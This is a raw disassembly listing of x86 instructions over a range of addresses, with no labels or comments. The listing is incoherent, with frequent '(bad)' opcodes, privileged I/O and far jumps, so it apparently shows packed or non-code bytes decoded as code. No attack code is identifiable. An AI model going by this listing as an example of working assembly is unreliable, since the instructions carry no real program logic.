  4143eb:	xchg   ebp,eax
  4143ec:	pop    DWORD PTR [eiz*8+0x42af674c]
  4143f3:	sbb    ebx,DWORD PTR [edx]
  4143f5:	mov    esi,0x8ec13398
  4143fa:	pusha  
  4143fb:	adc    DWORD PTR ds:0xe62606ed,eax
  414401:	jnp    0x414461
  414403:	mov    esi,eax
  414405:	jo     0x4143c2
  414407:	mov    eax,0x647dd070
  41440c:	sub    BYTE PTR [edi+edi*8],cl
  41440f:	nop
  414410:	lods   eax,DWORD PTR ds:[esi]
  414411:	mov    ebp,0xb1bcd69d
  414416:	fcomi  st,st(5)
  414418:	inc    edx
  414419:	cmp    eax,DWORD PTR [ebp-0x5d]
  41441c:	test   BYTE PTR [eax],bh
  41441e:	test   eax,0x2b09e178
  414423:	sub    BYTE PTR [ecx+0x5205e7dc],al
  414429:	xchg   ebp,eax
  41442a:	xchg   esp,eax
  41442b:	(bad)  
  41442c:	neg    DWORD PTR [ebx]
  41442e:	add    ecx,0x39
  414431:	in     al,0xfe
  414433:	sahf   
  414434:	outs   dx,BYTE PTR ds:[esi]
  414435:	adc    BYTE PTR [edx+0x33],ch
  414438:	mov    dl,0xa7
  41443a:	retf   0xe19b
  41443d:	iret   
  41443e:	xor    eax,DWORD PTR [edi-0x4fc98d79]
  414444:	jo     0x41445d
  414446:	push   esi
  414447:	lods   ax,WORD PTR ds:[esi]
  414449:	jmp    0x27f9cc77
  41444e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41444f:	dec    ecx
  414450:	push   ds
  414451:	mov    ecx,0xe0a6be25
  414456:	les    esp,FWORD PTR [ebp-0x6a7b11a5]
  41445c:	and    edx,edx
  41445e:	xlat   BYTE PTR ds:[ebx]
  41445f:	pop    esp
  414460:	or     al,0xb9
  414462:	push   dx
  414464:	sub    BYTE PTR [eax+0x49],bl
  414467:	or     eax,DWORD PTR [edi+0x4a]
  41446a:	mov    ebp,0xf3434aed
  41446f:	cmp    al,0x70
  414471:	pusha  
  414472:	idiv   BYTE PTR [ebx-0x68f25a12]
  414478:	sar    cl,1
  41447a:	ret    
  41447b:	and    al,0xb7
  41447d:	jne    0x41443e
  41447f:	add    DWORD PTR [ebx-0x17],edx
  414482:	dec    DWORD PTR [edi-0x6b9181c6]
  414488:	pop    edx
  414489:	imul   eax,DWORD PTR [edx+eiz*2+0x48ffc6b6],0xa73b10a4
  414494:	stos   BYTE PTR es:[edi],al
  414495:	rol    BYTE PTR [edx+0xa],1
  414498:	or     dl,BYTE PTR ss:[ecx-0x18]
  41449c:	lea    esi,[edx-0x5a230b92]
  4144a2:	or     BYTE PTR fs:[edi+0x5e],dl
  4144a6:	mov    WORD PTR [esi-0x22f59a12],?
  4144ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144ad:	aam    0xbd
  4144af:	adc    BYTE PTR [ebx],0xfb
  4144b2:	and    DWORD PTR [esp+ebx*2],edi
  4144b5:	xchg   ebp,eax
  4144b6:	adc    eax,0x606a5d65
  4144bb:	pop    ds
  4144bc:	sti    
  4144bd:	sbb    eax,DWORD PTR [esi-0x40df4c0d]
  4144c3:	or     eax,0xfc7fe321
  4144c8:	adc    al,0x22
  4144ca:	lds    ebp,FWORD PTR [ebx+0x6e]
  4144cd:	mov    edx,0x8caf6e69
  4144d2:	sub    al,0x4f
  4144d4:	jnp    0x4144e5
  4144d6:	xchg   edi,eax
  4144d7:	ret    0x6f86
  4144da:	cli    
  4144db:	ins    DWORD PTR es:[edi],dx
  4144dc:	mov    ds:0xef55cdb5,al
  4144e1:	sub    edi,edi
  4144e3:	mov    bl,0x15
  4144e5:	mov    ah,0x2c
  4144e8:	pop    edi
  4144e9:	dec    esi
  4144ea:	sbb    al,0xc5
  4144ec:	sub    ch,dh
  4144ee:	mov    cl,0xf1
  4144f0:	pop    ebx
  4144f1:	ror    DWORD PTR [ebx+0x27521eaf],cl
  4144f7:	jmp    0xd037:0xca1a66df
  4144fe:	jmp    0xf38c:0x10685b3e
  414505:	(bad)  
  414506:	or     eax,0xe2f1c03b
  41450b:	dec    ebx
  41450c:	xor    al,0xc1
  41450e:	gs into 
  414510:	and    DWORD PTR [edi],esi
  414512:	fcomp  st(6)
  414514:	lods   al,BYTE PTR ds:[esi]
  414515:	int3   
  414516:	cld    
  414517:	and    ebx,ecx
  414519:	and    bl,BYTE PTR [edx]
  41451b:	pop    ss
  41451c:	jae    0x414572
  41451e:	aas    
  41451f:	ret    0xd323
  414522:	jnp    0x41451c
  414524:	mov    ds:0xedb4430,al
  414529:	mov    al,0xe2
  41452b:	xchg   edi,eax
  41452c:	imul   ebp,DWORD PTR [edx],0xffffffdc
  41452f:	neg    esi
  414531:	xchg   ecx,eax
  414532:	rol    eax,cl
  414534:	cmc    
  414535:	mov    cl,0x7e
  414537:	(bad)  
  414538:	mov    al,0x63
  41453a:	jecxz  0x4144ce
  41453c:	sbb    eax,0x9cbe1df7
  414541:	sub    dh,ch
  414543:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414545:	add    BYTE PTR [ebx+0x44],al
  414548:	or     BYTE PTR [edi],al
  41454a:	xchg   esp,eax
  41454b:	(bad)  
  41454c:	xor    edx,eax
  41454e:	outs   dx,DWORD PTR ds:[esi]
  41454f:	inc    ebp
  414550:	mov    ecx,0x9cd8284
  414555:	cmp    DWORD PTR [eax+0x43],ebp
  414558:	push   ebx
  414559:	(bad)  
  41455a:	dec    esp
  41455b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455c:	push   edi
  41455d:	push   esp
  41455e:	repnz add eax,0xa178f03c
  414564:	pop    ebx
  414565:	xor    BYTE PTR [eax+0x25],0xeb
  414569:	orps   xmm3,XMMWORD PTR [ecx+0x63015d50]
  414570:	mov    esi,0x957d7257
  414575:	pop    esi
  414576:	arpl   WORD PTR [ebp+0x2b4631a2],ax
  41457c:	daa    
  41457d:	dec    esp
  41457e:	adc    BYTE PTR [ecx-0x39],ch
  414581:	ins    BYTE PTR es:[edi],dx
  414582:	iret   
  414583:	xchg   ecx,eax
  414584:	std    
  414585:	jns    0x4145e5
  414587:	std    
  414588:	jo     0x41454a
  41458a:	inc    eax
  41458b:	rol    al,0x47
  41458e:	test   DWORD PTR [ecx+0x1c],ecx
  414591:	xor    dh,bh
  414593:	jae    0x4145fb
  414595:	(bad)  
  414596:	jmp    0x41453a
  414598:	sub    dl,bh
  41459a:	mov    ebx,0xada4f2d3
  41459f:	out    0x57,al
  4145a1:	mov    eax,ds:0xb72cfdfe
  4145a6:	jnp    0x414568
  4145a8:	ja     0x414547
  4145aa:	movq   mm5,QWORD PTR [ecx]
  4145ad:	sbb    eax,ecx
  4145af:	mov    bl,ah
  4145b1:	sti    
  4145b2:	or     edx,DWORD PTR [edi]
  4145b4:	dec    edi
  4145b5:	pop    esp
  4145b6:	int    0xb9
  4145b8:	jno    0x41461c
  4145ba:	cmp    eax,0x5885d58
  4145bf:	mov    BYTE PTR [esi+0x6450daad],ah
  4145c5:	and    dh,cl
  4145c7:	jne    0x414645
  4145c9:	ficom  WORD PTR [ebp+0x78f20e5b]
  4145cf:	iret   
  4145d0:	lahf   
  4145d1:	add    bl,ch
  4145d3:	sub    eax,0x98b9b36b
  4145d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145d9:	jb     0x4145aa
  4145db:	icebp  
  4145dc:	sbb    bh,bl
  4145de:	jecxz  0x414600
  4145e0:	je     0x41461c
  4145e2:	pop    ebp
  4145e3:	xor    edx,ebp
  4145e5:	dec    esi
  4145e6:	add    BYTE PTR [eax-0x746b02ec],dh
  4145ec:	xchg   BYTE PTR ds:0x1e81cd7d,bl
  4145f2:	sbb    DWORD PTR [edi-0x1f],ebx
  4145f5:	sbb    BYTE PTR [edx+esi*4],0x13
  4145f9:	nop
  4145fa:	cld    
  4145fb:	xlat   BYTE PTR ds:[ebx]
  4145fc:	inc    ebp
  4145fd:	push   ecx
  4145fe:	and    DWORD PTR [ebx+0x3cde1d3d],edi
  414604:	xchg   edx,eax
  414605:	dec    edx
  414606:	xor    al,0x3a
  414608:	and    eax,0xa307ad3c
  41460d:	adc    BYTE PTR [esi+0x3b],ch
  414610:	jmp    0x6db7:0xd924349f
  414617:	rcl    DWORD PTR [eax-0x313c6cf6],0xba
  41461e:	repz xchg esp,eax
  414620:	or     esp,esi
  414622:	mov    ch,0x27
  414624:	dec    esi
  414625:	int3   
  414626:	pop    ss
  414627:	jge    0x4145d0
  414629:	xor    BYTE PTR [ebp+0x2df5371a],0xba
  414630:	mov    ch,0x1d
  414632:	pop    ss
  414633:	xor    BYTE PTR [ecx+0x58],ch
  414636:	jbe    0x41466e
  414638:	mov    ebp,0x462a2ade
  41463d:	adc    bl,BYTE PTR [edx]
  41463f:	pop    edi
  414640:	call   0xf077569a
  414645:	mov    ecx,0x64bc88c6
  41464a:	push   ds
  41464b:	push   0x76de8611
  414650:	dec    esp
  414651:	jae    0x414635
  414653:	fdivr  DWORD PTR [esi+0x3dd7b0e9]
  414659:	push   edx
  41465a:	sub    eax,0x6bdedf8c
  41465f:	cmc    
  414660:	popf   
  414661:	cmp    al,0xcd
  414663:	retf   
  414664:	mov    eax,0x8b11e85a
  414669:	enter  0x6979,0x2d
  41466d:	adc    al,0x81
  41466f:	lahf   
  414670:	(bad)  
  414672:	inc    esp
  414673:	imul   edi,DWORD PTR [ebp+ebx*4-0xa],0xdb374991
  41467b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41467c:	inc    esp
  41467d:	sbb    al,dh
  41467f:	mov    ds:0xa93479c,eax
  414684:	sbb    ebp,DWORD PTR [ecx-0x290d7f0d]
  41468a:	pop    esi
  41468b:	stos   DWORD PTR es:[edi],eax
  41468c:	mov    ds:0x991e6bf8,eax
  414691:	div    BYTE PTR [edx-0x3a]
  414694:	xchg   esp,eax
  414695:	mov    esi,0xa139581d
  41469a:	shl    DWORD PTR [edx-0xee994e7],cl
  4146a0:	std    
  4146a1:	push   ss
  4146a2:	rcl    BYTE PTR [ebx+0x14],cl
  4146a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a6:	mov    DWORD PTR [eax+0x2b],0xa7a65ef4
  4146ad:	pop    ecx
  4146ae:	neg    dl
  4146b0:	mov    ebp,0x6e3eba75
  4146b5:	arpl   WORD PTR [ebp-0x8513d40],si
  4146bb:	aam    0x24
  4146bd:	bound  esi,QWORD PTR [eax-0x29]
  4146c0:	fild   WORD PTR [ecx]
  4146c2:	les    ecx,FWORD PTR ds:0xd21cc521
  4146c8:	sbb    ecx,DWORD PTR [ebp+eax*4-0x57]
  4146cc:	clc    
  4146cd:	sub    eax,esp
  4146cf:	jg     0x4146cd
  4146d1:	push   ebx
  4146d2:	or     eax,0xda323126
  4146d7:	jmp    0x414703
  4146d9:	daa    
  4146da:	or     al,0x41
  4146dc:	pop    edi
  4146dd:	out    0xb1,eax
  4146df:	push   edx
  4146e0:	bound  ecx,QWORD PTR [eax+0x62af8d1c]
  4146e6:	jmp    0xdb79:0x69026829
  4146ed:	mov    bh,0xe2
  4146ef:	add    al,0xbc
  4146f1:	mov    ds:0x6d3ed373,eax
  4146f6:	inc    ebp
  4146f7:	popf   
  4146f8:	sbb    DWORD PTR ds:0x77bcdd02,eax
  4146fe:	inc    eax
  4146ff:	fcom   QWORD PTR [esi-0x68]
  414702:	adc    BYTE PTR [edx-0x79],ah
  414705:	icebp  
  414706:	dec    eax
  414707:	sub    dl,BYTE PTR [eax+0x50]
  41470a:	(bad)  [eax-0x26]
  41470d:	dec    ecx
  41470e:	loop   0x414718
  414710:	mov    cl,BYTE PTR [eax+ebx*4+0x78510bbc]
  414717:	and    ax,0xe28c
  41471b:	clc    
  41471c:	mov    eax,edx
  41471e:	sbb    ebx,ecx
  414720:	jg     0x4146f3
  414722:	mov    ds:0x63ba710,eax
  414727:	pop    edi
  414728:	outs   dx,DWORD PTR ds:[esi]
  414729:	inc    ebx
  41472a:	shl    cl,1
  41472c:	mov    BYTE PTR [edx+0x3517bbb1],ch
  414732:	xor    BYTE PTR [edx+eiz*1-0x71537bc1],cl
  414739:	call   0x5e35:0xef19517f
  414740:	and    BYTE PTR [ebp+0x6b],0xd
  414744:	jmp    0x96d2:0x88652c30
  41474b:	idiv   BYTE PTR [edi-0x3b]
  41474e:	sub    DWORD PTR [edx+0x19c456b],0xffffffe7
  414755:	inc    edx
  414756:	cmp    cl,BYTE PTR [eax-0x52]
  414759:	dec    edx
  41475a:	nop
  41475b:	xchg   ecx,eax
  41475c:	cld    
  41475d:	loop   0x414793
  41475f:	fild   WORD PTR [edi]
  414761:	imul   DWORD PTR [ebx+0xd]
  414764:	in     eax,dx
  414765:	test   DWORD PTR [esp+ebp*2],edi
  414768:	inc    esi
  414769:	or     ebp,esp
  41476b:	jno    0x41477e
  41476d:	lahf   
  41476e:	out    0x5b,al
  414770:	jge    0x4147d7
  414772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414773:	adc    DWORD PTR [edi],0xfffffffa
  414776:	mov    al,0x83
  414778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414779:	clc    
  41477a:	push   0xffffff87
  41477c:	inc    esp
  41477d:	xchg   esi,eax
  41477e:	fxch   st(7)
  414780:	jmp    0xaade:0x19f12c65
  414787:	add    BYTE PTR [eax+0x27d76d84],0xf7
  41478e:	xchg   edx,eax
  41478f:	add    ch,dl
  414791:	add    dl,BYTE PTR [eax-0x1ebfa39b]
  414797:	stc    
  414798:	sar    BYTE PTR ds:0x5316d2ca,0x87
  41479f:	mov    ds:0x125b91bb,eax
  4147a4:	inc    edi
  4147a5:	push   ebx
  4147a6:	cmp    ebx,edx
  4147a8:	dec    esi
  4147a9:	int    0x42
  4147ab:	scas   eax,DWORD PTR es:[edi]
  4147ac:	rcr    BYTE PTR [ecx+edi*4+0x6fc869be],cl
  4147b3:	fs and al,0x7e
  4147b6:	test   bh,dl
  4147b8:	mov    eax,DWORD PTR [ebp-0x4b]
  4147bb:	or     DWORD PTR [ebx-0x4aa0d1dd],edx
  4147c1:	sub    al,0xf
  4147c3:	jle    0x4147f1
  4147c5:	xchg   ebp,eax
  4147c6:	mov    ds:0x98f7b6be,al
  4147cb:	leave  
  4147cc:	stos   DWORD PTR es:[edi],eax
  4147cd:	sub    eax,0x3c791f84
  4147d2:	sub    DWORD PTR [ecx],ebx
  4147d4:	daa    
  4147d5:	pop    esi
  4147d6:	fwait
  4147d7:	push   esp
  4147d8:	dec    edi
  4147d9:	je     0x4147d5
  4147db:	jne    0x4147d0
  4147dd:	fistp  QWORD PTR [edx]
  4147df:	fcmovnbe st,st(7)
  4147e1:	jne    0x4147a9
  4147e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e4:	scas   al,BYTE PTR es:[edi]
  4147e5:	popf   
  4147e6:	addr16 sbb al,0x2b
  4147e9:	scas   al,BYTE PTR es:[edi]
  4147ea:	dec    esi
  4147eb:	jg     0x414861
  4147ed:	inc    ecx
  4147ee:	mov    bl,0xbc
  4147f0:	sbb    al,0x38
  4147f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147f3:	stos   BYTE PTR es:[edi],al
  4147f4:	jecxz  0x4147e8
  4147f6:	(bad)  
  4147f7:	fdivr  QWORD PTR [edx*8-0x10a1a4b7]
  4147fe:	and    al,0x68
  414800:	add    ebp,esp
  414802:	shl    BYTE PTR [esi],1
  414804:	in     eax,dx
  414805:	or     al,0x1f
  414807:	fwait
  414808:	pushf  
  414809:	imul   esi,DWORD PTR [ebp-0xd],0x1c
  41480d:	xchg   ebp,eax
  41480e:	add    eax,0x88555443
  414813:	leave  
  414814:	repnz xor al,0xb8
  414817:	or     eax,DWORD PTR [ecx+0x57]
  41481a:	sub    al,0x4
  41481c:	hlt    
  41481d:	in     al,dx
  41481e:	pop    edx
  41481f:	mov    ah,0x3
  414821:	push   esp
  414822:	inc    esp
  414823:	adc    DWORD PTR [ecx-0x63115ba2],esp
  414829:	call   0xe23a8acd
  41482e:	jecxz  0x4147da
  414830:	inc    eax
  414831:	loopne 0x4147dd
  414833:	arpl   WORD PTR [ecx-0x6d],dx
  414836:	dec    ecx
  414837:	unpcklps xmm6,xmm6
  41483a:	or     bh,BYTE PTR [ecx+eax*2-0x9]
  41483e:	das    
  41483f:	ins    BYTE PTR es:[edi],dx
  414840:	imul   ebx,edx,0xb4075233
  414846:	call   0xea1f:0xb0d43a9e
  41484d:	rcl    BYTE PTR [ebp+0x4c527ccd],0xe4
  414854:	ret    0xe5af
  414857:	push   edi
  414858:	ins    BYTE PTR es:[edi],dx
  414859:	ret    0xb51
  41485c:	xor    eax,0xfeb089c1
  414861:	pop    esi
  414862:	lea    esi,[edx-0x6de65612]
  414868:	mov    ebx,DWORD PTR [edx]
  41486a:	mov    ebx,0x691b5acb
  41486f:	and    bl,BYTE PTR [edi-0x23f7d4c0]
  414875:	xchg   ebp,eax
  414876:	out    0x69,al
  414878:	into   
  414879:	hlt    
  41487a:	aaa    
  41487b:	pop    ecx
  41487c:	cmp    al,0xa8
  41487e:	scas   eax,DWORD PTR es:[edi]
  41487f:	add    bl,dl
  414881:	mov    esp,esp
  414883:	stc    
  414884:	bound  ebx,QWORD PTR ds:0x2822b156
  41488a:	add    DWORD PTR [edi-0x389cae0f],edi
  414890:	dec    esi
  414891:	(bad)  
  414892:	pop    ss
  414893:	add    DWORD PTR [ebx-0x80],ecx
  414896:	cdq    
  414897:	mov    edx,DWORD PTR [esi-0x43fe0eb8]
  41489d:	icebp  
  41489e:	hlt    
  41489f:	ss std 
  4148a1:	cmp    al,0xf5
  4148a3:	push   edi
  4148a4:	mov    dh,0x86
  4148a6:	cmp    al,0x9e
  4148a8:	xor    DWORD PTR [eax+0x1117e124],ecx
  4148ae:	sti    
  4148af:	out    0xb6,eax
  4148b1:	mov    eax,ds:0x5e30252b
  4148b6:	lea    ecx,[esi-0x1147d519]
  4148bc:	popa   
  4148bd:	in     eax,dx
  4148be:	inc    ecx
  4148bf:	ja     0x414938
  4148c1:	ret    0xe74
  4148c4:	in     al,0xc8
  4148c6:	add    al,0x36
  4148c8:	leave  
  4148c9:	mov    esi,0x65c42e20
  4148ce:	pop    esp
  4148cf:	jb     0x41487f
  4148d1:	mov    esp,0xad1b141d
  4148d6:	jecxz  0x414922
  4148d8:	aam    0xcb
  4148da:	call   0x19df128
  4148df:	mov    eax,0xdd86b488
  4148e4:	adc    edi,DWORD PTR [edi]
  4148e6:	and    DWORD PTR [ebx-0xc],ebp
  4148e9:	cmp    ebx,DWORD PTR [ecx+0x16e9b42c]
  4148ef:	sar    bl,1
  4148f1:	rcl    DWORD PTR [ebp+eax*4-0x2a85b966],1
  4148f8:	lods   eax,DWORD PTR ds:[esi]
  4148f9:	push   ebx
  4148fa:	lahf   
  4148fb:	out    0xf6,eax
  4148fd:	call   0xeb240db
  414902:	enter  0xde3e,0x1d
  414906:	cmp    DWORD PTR [ecx],edx
  414908:	int    0x75
  41490a:	sbb    DWORD PTR [ebp+eax*8-0x6c],ebp
  41490e:	xchg   ecx,eax
  41490f:	xchg   ebp,eax
  414910:	lods   al,BYTE PTR ds:[esi]
  414911:	cmp    dh,BYTE PTR [edi+0x60]
  414914:	popf   
  414915:	and    DWORD PTR [ebx],edx
  414917:	aam    0x9
  414919:	aam    0xe4
  41491b:	mov    gs,WORD PTR [ecx]
  41491d:	lods   al,BYTE PTR ds:[esi]
  41491e:	mov    edi,0xdc03ba3d
  414923:	push   edx
  414924:	(bad)  
  414925:	mov    ?,WORD PTR [edi+0x13]
  414928:	mov    BYTE PTR [ecx],cl
  41492a:	je     0x41498a
  41492c:	sbb    DWORD PTR [esi-0xe],ebx
  41492f:	in     eax,dx
  414930:	or     esp,esp
  414932:	xor    al,BYTE PTR [ebx+0x3b]
  414935:	add    DWORD PTR [esi],ecx
  414937:	sar    BYTE PTR [edx],cl
  414939:	xchg   esi,eax
  41493a:	sub    DWORD PTR [ecx+ecx*2+0x35],edx
  41493e:	enter  0xf146,0xae
  414942:	in     al,dx
  414943:	mov    ebx,DWORD PTR [eax+ebp*1]
  414946:	mov    ch,0x43
  414948:	and    BYTE PTR [esi+0x2da41d2c],dh
  41494e:	push   ecx
  41494f:	xchg   ecx,eax
  414950:	sub    ah,BYTE PTR [eax-0x10919ab0]
  414956:	in     al,dx
  414957:	mov    esi,0x6664ab1e
  41495c:	addr16 es sub al,0xe1
  414960:	sbb    edx,ebp
  414962:	(bad)  
  414963:	cmp    DWORD PTR [ecx],ebx
  414965:	rcr    bh,0x6c
  414968:	xchg   ebx,eax
  414969:	jp     0x414984
  41496b:	adc    BYTE PTR [edi+0x77],dh
  41496e:	dec    ebp
  41496f:	push   ebp
  414970:	mov    al,0xbd
  414972:	inc    ebx
  414973:	scas   al,BYTE PTR es:[edi]
  414974:	aam    0xe
  414976:	and    eax,0xf8139bca
  41497b:	push   ss
  41497c:	mov    edx,0x504ff1d2
  414981:	clc    
  414982:	mov    ds:0xa25465a1,eax
  414987:	xchg   BYTE PTR [eax],ch
  414989:	mov    esp,0x1d71b581
  41498e:	fcomip st,st(5)
  414990:	jge    0x414995
  414992:	adc    DWORD PTR [edx+0x1b],0x9d569bc8
  414999:	(bad)  [ebx+0x1]
  41499c:	inc    edi
  41499d:	jo     0x414a1b
  41499f:	mov    eax,ds:0xefe0383f
  4149a4:	adc    DWORD PTR [ecx-0x5e],ecx
  4149a7:	xor    al,0xb8
  4149a9:	xor    ecx,ebp
  4149ab:	ret    
  4149ac:	outs   dx,BYTE PTR ds:[esi]
  4149ad:	ret    0x1247
  4149b0:	stos   DWORD PTR es:[edi],eax
  4149b1:	dec    ecx
  4149b2:	push   edx
  4149b3:	push   0x2c
  4149b5:	ds repnz xchg edx,eax
  4149b8:	(bad)  
  4149b9:	jb     0x41493b
  4149bb:	dec    ecx
  4149bc:	inc    eax
  4149bd:	jp     0x4149f1
  4149bf:	div    esp
  4149c1:	fs ret 
  4149c3:	push   ss
  4149c4:	not    DWORD PTR [eax]
  4149c6:	std    
  4149c7:	nop
  4149c8:	int3   
  4149c9:	xchg   edi,eax
  4149ca:	outs   dx,DWORD PTR ds:[esi]
  4149cb:	inc    edi
  4149cc:	enter  0x82d9,0x81
  4149d0:	mov    bh,0x68
  4149d2:	test   BYTE PTR [edi+0x7d],dh
  4149d5:	mov    esi,0x18d82ddb
  4149da:	aad    0x1d
  4149dc:	or     al,0xce
  4149de:	inc    eax
  4149df:	js     0x4149e6
  4149e1:	push   ebx
  4149e2:	push   ecx
  4149e3:	shl    BYTE PTR [eax-0x478eb444],cl
  4149e9:	jo     0x414993
  4149eb:	pusha  
  4149ec:	cwde   
  4149ed:	and    eax,0x670317b5
  4149f2:	jns    0x414993
  4149f4:	sbb    BYTE PTR [ebp-0x38],dl
  4149f7:	pop    ebp
  4149f8:	call   0xdebd:0x73a663af
  4149ff:	pop    DWORD PTR [ebx]
  414a01:	add    al,0xee
  414a03:	loopne 0x414a43
  414a05:	int    0x6f
  414a07:	imul   esp,DWORD PTR [ecx+eax*2+0x5b],0xcec1d4c6
  414a0f:	iret   
  414a10:	mov    dl,0xc3
  414a12:	pop    ss
  414a13:	enter  0x1aba,0x64
  414a17:	mov    al,0xaa
  414a19:	push   ds
  414a1a:	jo     0x414a89
  414a1c:	aad    0x7
  414a1e:	xor    eax,DWORD PTR [edx+0x1a4a0c64]
  414a24:	(bad)  
  414a25:	fldcw  WORD PTR [edx*2+0x1e280270]
  414a2c:	icebp  
  414a2d:	je     0x414a6c
  414a2f:	cdq    
  414a30:	sbb    cl,BYTE PTR [edi+ecx*1]
  414a33:	adc    cl,al
  414a35:	inc    ebx
  414a36:	popf   
  414a37:	inc    edi
  414a38:	xor    al,0x4f
  414a3a:	rcl    DWORD PTR [eax],cl
  414a3c:	je     0x414a29
  414a3e:	mov    eax,ds:0x7373d9ea
  414a43:	in     al,dx
  414a44:	into   
  414a45:	ins    BYTE PTR es:[edi],dx
  414a46:	imul   BYTE PTR [ebp+0x4a180446]
  414a4c:	xchg   BYTE PTR [esi-0x46],dh
  414a4f:	dec    edx
  414a50:	cdq    
  414a51:	in     al,0x94
  414a53:	js     0x414aca
  414a55:	or     cl,cl
  414a57:	loop   0x414a62
  414a59:	in     eax,dx
  414a5a:	jae    0x414aa0
  414a5c:	jae    0x414a37
  414a5e:	mov    al,0xe5
  414a60:	leave  
  414a61:	cmp    DWORD PTR [edx-0x50c8dbe4],ecx
  414a67:	inc    ecx
  414a68:	stos   BYTE PTR es:[edi],al
  414a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a6a:	call   0x3991c291
  414a6f:	or     eax,0xd96494b
  414a74:	jecxz  0x414a64
  414a76:	outs   dx,DWORD PTR ds:[esi]
  414a77:	int3   
  414a78:	dec    esp
  414a79:	push   ebx
  414a7a:	int    0xc1
  414a7c:	push   0xffffffd4
  414a7e:	dec    ebp
  414a7f:	(bad)  
  414a80:	push   ebp
  414a81:	cmp    BYTE PTR [edx-0x5e],dh
  414a84:	pop    ecx
  414a85:	adc    DWORD PTR [edx],0xdd8d6f4
  414a8b:	(bad)
  414a8f:	(bad)  
  414a90:	in     eax,dx
  414a91:	push   ebp
  414a92:	dec    ebp
  414a93:	xchg   BYTE PTR [eax+eiz*4-0x70],ah
  414a97:	pop    edx
  414a98:	test   BYTE PTR [esi+0x6c9dfedf],0x55
  414a9f:	cs push ebx
  414aa1:	js     0x414a6d
  414aa3:	(bad)  
  414aa4:	and    bh,dh
  414aa6:	mov    bl,0xf1
  414aa8:	mov    al,0x9f
  414aaa:	mov    ds:0x9df06511,eax
  414aaf:	mov    esi,0xdc2074e1
  414ab4:	or     eax,DWORD PTR [edx+esi*8]
  414ab7:	ins    DWORD PTR es:[edi],dx
  414ab8:	in     eax,0xb1
  414aba:	inc    ecx
  414abb:	mov    al,0xcf
  414abd:	dec    eax
  414abe:	into   
  414abf:	sbb    edx,DWORD PTR [ebp-0x245652bf]
  414ac5:	pop    ds
  414ac6:	xchg   DWORD PTR [eiz*8-0x1e35b3a7],edx
  414acd:	pop    es
  414ace:	pop    edi
  414acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad0:	jnp    0x414a7a
  414ad2:	retf   
  414ad3:	ret    0x811e
  414ad6:	xchg   esi,eax
  414ad7:	jmp    0x414ad0
  414ad9:	jge    0x414ad8
  414adb:	or     DWORD PTR [eax+0x5c],esp
  414ade:	fmul   st,st(6)
  414ae0:	mov    bh,0x79
  414ae2:	sti    
  414ae3:	inc    eax
  414ae4:	ds pop ebx
  414ae6:	outs   dx,BYTE PTR ds:[esi]
  414ae7:	sbb    bl,BYTE PTR [ebx]
  414ae9:	bound  eax,QWORD PTR [edi+0x56f50eff]
  414aef:	mov    edi,0xaac2fc9c
  414af4:	sbb    eax,0x2e7b565a
  414af9:	jg     0x414b62
  414afb:	xchg   esi,eax
  414afc:	aaa    
  414afd:	lds    esp,FWORD PTR [ebp+0x52]
  414b00:	popf   
  414b01:	jnp    0x414b06
  414b03:	lock ds mov ch,0xff
  414b07:	aas    
  414b08:	popf   
  414b09:	leave  
  414b0a:	dec    ecx
  414b0b:	cmp    al,0x56
  414b0d:	push   esi
  414b0e:	sbb    eax,0x29023f45
  414b13:	clc    
  414b14:	mov    bp,0x4069
  414b18:	xchg   ecx,eax
  414b19:	imul   ebx,eax,0x31b8d794
  414b1f:	sbb    BYTE PTR [esi-0x560417a2],al
  414b25:	mov    edx,0x763d7762
  414b2a:	mov    ds:0xb9a7d416,al
  414b2f:	mov    ecx,0x1fbe725a
  414b34:	sub    dh,BYTE PTR [esi+0x20]
  414b37:	hlt    
  414b38:	sbb    edx,DWORD PTR [edi-0x3a]
  414b3b:	mov    edx,0x94bc1a2b
  414b40:	scas   al,BYTE PTR es:[edi]
  414b41:	out    dx,eax
  414b42:	rcl    DWORD PTR [eax],1
  414b44:	jmp    0x488:0xadefc384
  414b4b:	addr16 imul edx,edi,0x37
  414b4f:	ins    BYTE PTR es:[edi],dx
  414b50:	sub    ebp,DWORD PTR [ebp-0x1b0cac16]
  414b56:	ret    
  414b57:	xchg   DWORD PTR [ebx+ebx*8],eax
  414b5a:	pop    esi
  414b5b:	push   ebx
  414b5c:	(bad)  
  414b5d:	xor    edx,DWORD PTR [edi]
  414b5f:	ins    DWORD PTR es:[edi],dx
  414b60:	pusha  
  414b61:	fcmovnb st,st(2)
  414b63:	fsub   st(3),st
  414b65:	test   eax,0x2dffd877
  414b6a:	bound  esi,QWORD PTR [edi+0x776b9171]
  414b70:	sbb    esp,DWORD PTR [edi-0xba8cec9]
  414b76:	sets   BYTE PTR [esi-0x32]
  414b7a:	push   ebx
  414b7b:	addr16 pusha 
  414b7d:	js     0x414bd8
  414b7f:	cwde   
  414b80:	test   DWORD PTR [ecx+eiz*4-0x48f5af5e],esp
  414b87:	fidiv  DWORD PTR ss:[ebp-0x47]
  414b8b:	(bad)  
  414b8c:	fcom   DWORD PTR [ecx+0xc1434c]
  414b92:	push   bx
  414b94:	sbb    eax,DWORD PTR [esi]
  414b96:	mov    al,0x67
  414b98:	and    ebp,DWORD PTR [ecx+0x1f801c1c]
  414b9e:	jmp    0xcd03:0xa00153a7
  414ba5:	icebp  
  414ba6:	std    
  414ba7:	jae    0x414b6e
  414ba9:	mov    dl,0x6a
  414bab:	xchg   esi,eax
  414bac:	or     dl,BYTE PTR cs:[di]
  414bb0:	xchg   ecx,eax
  414bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb2:	dec    ebx
  414bb3:	inc    edi
  414bb4:	loopne 0x414c24
  414bb6:	dec    esp
